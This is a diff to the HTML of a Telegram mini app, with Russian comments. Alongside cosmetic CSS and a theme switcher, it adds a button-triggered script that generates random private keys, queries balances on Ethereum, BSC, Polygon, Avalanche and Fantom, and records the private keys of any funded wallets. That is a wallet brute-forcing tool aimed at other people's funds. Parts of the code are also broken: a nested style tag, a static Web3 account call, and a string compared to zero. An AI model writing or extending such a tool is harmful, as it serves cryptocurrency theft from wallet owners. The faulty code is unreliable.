@@ -5,6 +5,63 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AMOLED MiniApp</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script>
+const Web3 = window.Web3;
+
+const NETWORKS = {
+    "Ethereum": "https://mainnet.infura.io/v3/YOUR_INFURA_API_KEY",
+    "Binance Smart Chain": "https://bsc-dataseed.binance.org/",
+    "Polygon": "https://polygon-rpc.com",
+    "Avalanche": "https://api.avax.network/ext/bc/C/rpc",
+    "Fantom": "https://rpc.ftm.tools/",
+};
+
+function generateWallet() {
+    // В реальности, генерация кошелька в браузере сложнее и требует безопасности
+    const privateKey = Web3.utils.randomHex(32);
+    const account = Web3.eth.accounts.privateKeyToAccount(privateKey);
+    return { privateKey: privateKey, address: account.address };
+}
+
+async function checkBalance(networkName, rpcUrl, address) {
+    const web3 = new Web3(new Web3.providers.HttpProvider(rpcUrl));
+    try {
+        const balance = await web3.eth.getBalance(address);
+        return web3.utils.fromWei(balance, 'ether');
+    } catch (error) {
+        console.error(`Ошибка при подключении к ${networkName}:`, error);
+        return null;
+    }
+}
+
+async function searchWallets() {
+    const wallets = [];
+    for (let i = 0; i < 1000; i++) { // Количество адресов для генерации
+        const wallet = generateWallet();
+        for (const [networkName, rpcUrl] of Object.entries(NETWORKS)) {
+            const balance = await checkBalance(networkName, rpcUrl, wallet.address);
+            if (balance > 0) {
+                wallets.push({
+                    network: networkName,
+                    address: wallet.address,
+                    privateKey: wallet.privateKey,
+                    balance: parseFloat(balance),
+                    foundAt: new Date().toISOString()
+                });
+                console.log(`Найдено: ${networkName} | Адрес: ${wallet.address} | Баланс: ${balance}`);
+            }
+        }
+    }
+    // Здесь вы могли бы сохранить результаты или отобразить их
+    console.log('Найденные кошельки:', wallets);
+}
+
+// Запуск поиска по нажатию на кнопку
+document.querySelector('.button').addEventListener('click', async function() {
+    await searchWallets();
+});
+    </script>
     <style>
         body {
             margin: 0;
@@ -109,6 +166,49 @@
             border-radius: 50%;
             margin-right: 10px;
         }
+        <style>
+    /* Добавьте это в ваш существующий CSS */
+    .modal-content {
+        background-color: rgba(0, 176, 155, 0.8); /* Используем цвет основного фона */
+        backdrop-filter: blur(10px);
+        color: white;
+        border: none;
+    }
+    .settings-list li {
+        margin: 10px 0;
+        font-size: 16px;
+    }
+    .user-info {
+        display: flex;
+        align-items: center;
+        margin-bottom: 20px;
+    }
+    .user-info img {
+        border: 2px solid rgba(255, 255, 255, 0.5);
+    }
+    select {
+        background: rgba(255, 255, 255, 0.3);
+        color: white;
+        border: none;
+        padding: 5px;
+        border-radius: 10px;
+    }
+        @keyframes gradientShift {
+    0% {
+        background-position: 0% 50%;
+    }
+    50% {
+        background-position: 100% 50%;
+    }
+    100% {
+        background-position: 0% 50%;
+    }
+}
+
+body {
+    animation: gradientShift 20s ease infinite;
+}
+</style>
     </style>
 </head>
 <body>
@@ -162,7 +262,18 @@
             var modal = document.getElementById("myModal");
             modal.style.display = "block";
         }
+ function changeTheme(theme) {
+    if (theme === 'dark') {
+        document.body.style.background = 'linear-gradient(to bottom right, #000000, #333333)';
+    } else {
+        document.body.style.background = 'linear-gradient(to bottom right, #00b09b, #96c93d)';
+    }
+}
 
+document.getElementById('themes').addEventListener('change', function(event) {
+    changeTheme(event.target.value);
+});
+        
         // Функция для закрытия модального окна
         function closeModal() {
             var modal = document.getElementById("myModal");
